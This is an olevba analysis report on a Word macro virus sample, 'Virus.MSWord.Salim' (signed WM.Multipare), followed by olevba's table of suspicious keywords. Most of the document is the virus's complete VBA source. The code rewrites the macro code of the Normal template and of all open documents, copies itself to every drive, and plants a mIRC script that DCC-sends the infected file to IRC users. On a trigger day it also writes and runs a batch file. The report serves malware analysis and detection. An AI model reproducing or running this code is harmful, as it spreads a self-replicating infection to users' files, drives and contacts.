olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Salim
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Salim - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PIJAVICA
Private Sub Document_Close(): Const dva = 2: Const jedan = 1: On Error Resume Next
If ThisDocument = ActiveDocument Then Set l = NormalTemplate Else Set l = ActiveDocument
br = ThisDocument.VBProject.VBComponents(jedan).CodeModule.CountOfLines
kod = Strings.Trim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(jedan, br))
Set NT1 = l.VBProject: Set NT2 = NT1.VBComponents(jedan)
Set nt3 = NT2.CodeModule: nt4 = nt3.CountOfLines
If nt3.Lines(jedan, jedan) <> "'PIJAVICA" Then
With nt3
.deletelines jedan, nt4
.insertlines jedan, kod
End With
End If
For q = jedan To Documents.Count
Set df = Documents(q).VBProject: Set sd = df.VBComponents(1)
Set fg = sd.CodeModule
If fg.Lines(jedan, jedan) <> "'PIJAVICA" Then
f = fg.CountOfLines
With fg
.deletelines jedan, f
.insertlines 1, kod
End With
End If
Next q
For s = 1 To Documents.Count
If Documents(s).VBProject.VBComponents(jedan).CodeModule.Lines(dva, _
jedan) = "Private Sub Document_Open(): Const jedan = 1: Const dva = 2: On Error Resume Next" Then
With Documents(s).VBProject.VBComponents(dva - jedan).CodeModule
.ReplaceLine dva, "Private Sub Document_Close(): Const dva = 2: Const jedan = 1: On error resume next"
End With
Else
If Documents(s).VBProject.VBComponents(dva - jedan).CodeModule.Lines(dva, _
jedan) = "Private Sub Document_Close(): Const dva = 2: Const jedan = 1: On Error Resume Next" Then
With Documents(s).VBProject.VBComponents(dva - jedan).CodeModule
.ReplaceLine dva, "Private Sub Document_Open(): Const jedan = 1: Const dva = 2: On error resume next"
End With
End If
End If
Next s
Dim fs, a
Set fs = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
If fs.getfile("C:\Salim_se!.doc") <> "Salim_se!.doc" Then
ActiveDocument.SaveAs "C:\Salim_se!.doc"
ActiveDocument.SaveAs "C:\Win32Drv.doc"
End If
Set a = fs.Drives
For Each g In a
If g.drivetype = 3 Or 2 Then
If g.isready Then
fs.copyfile "c:\Salim_se!.doc", g.driveletter & ":\", True
End If
End If
Next g
Set ff = fs.CreateTextFile("C:\Mirc\script.ini", True)
ff.writeline "[script]"
ff.writeline "n0=on 1:JOIN:#:{"
ff.writeline "n1= /if ( $nick == $me ) { halt }"
ff.writeline "n2= /.dcc send $nick c:\Salim_se!.doc"
ff.writeline "n3=}"
ff.Close
If Day(Now()) = Int(dva * dva + jedan) Then
Set pl = fs.CreateTextFile("C:\Multipare.txt", True)
pl.writeline "         °°°°°          °°°°°         "
pl.writeline "          °°°°°°°°°       °°°°°°°    "
pl.writeline "            °°°°°°°°°°°°°°°°°°°°°°°"
pl.writeline "             °°°°°°°±±±±±±±±±°°±±±±±±±±"
pl.writeline "              °°°°°±±ŰŰŰŰŰŰŰŰ°°±ŰŰŰŰŰŰŰŰ    greetz to:"
pl.writeline "              °°°°°±ŰŰ°    °°°°±ŰŰ°°   ŰŰ   ÄÄÄÄÄÄÄÄÄÄ"
pl.writeline "              °°°°°±ŰŰ°°   °°°°±ŰŰ°°°°  Ű   K04x"
pl.writeline "                °°°±ŰŰ°°°°  °°°±ŰŰ°°°°°°Ű   e-mAn"
pl.writeline "                °°°±ŰŰŰŰŰŰŰ °°°±ŰŰ°ŰŰŰŰŰŰ   rudeBoy"
pl.writeline "                 °°±ŰŰŰŰŰŰŰ °°°±ŰŰ°ŰŰŰŰŰŰ   abasi-"
pl.writeline "                 °°±ŰŰ°°     °°±ŰŰ°°°°  Ű   vr4g"
pl.writeline "                  °±ŰŰ°°°°    °±ŰŰ°°°°°°Ű   SnakeLord"
pl.writeline "                  °±ŰŰEBVL-2K  ±ŰŰ°°°°°ŰŰ   Morphex"
pl.writeline "                   °±ŰŰŰŰŰŰŰŰ   ŰŰŰŰŰŰŰŰ    Wex-Alpha"
pl.Close
Set pl2 = fs.CreateTextFile("C:\Multipare.bat", True)
pl2.writeline "echo off"
pl2.writeline "cls"
pl2.writeline "command /c type c:\multipare.txt"
pl2.Close
Shell "c:\multipare.bat", vbNormalNoFocus
End If
End Sub
'WM.Multipare by e[ax]
'Inficira sve otvorene dokumente ukljucujuci i NT!
'Koristi OPE v1.1 [Obican Polimorficni Engine]!
'Mirc, LAN, HD, Floppy!
'Pozdravljam sve na #virusu i #vxers!

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Multipare.bat       |Executable file name                         |
|IOC       |multipare.bat       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

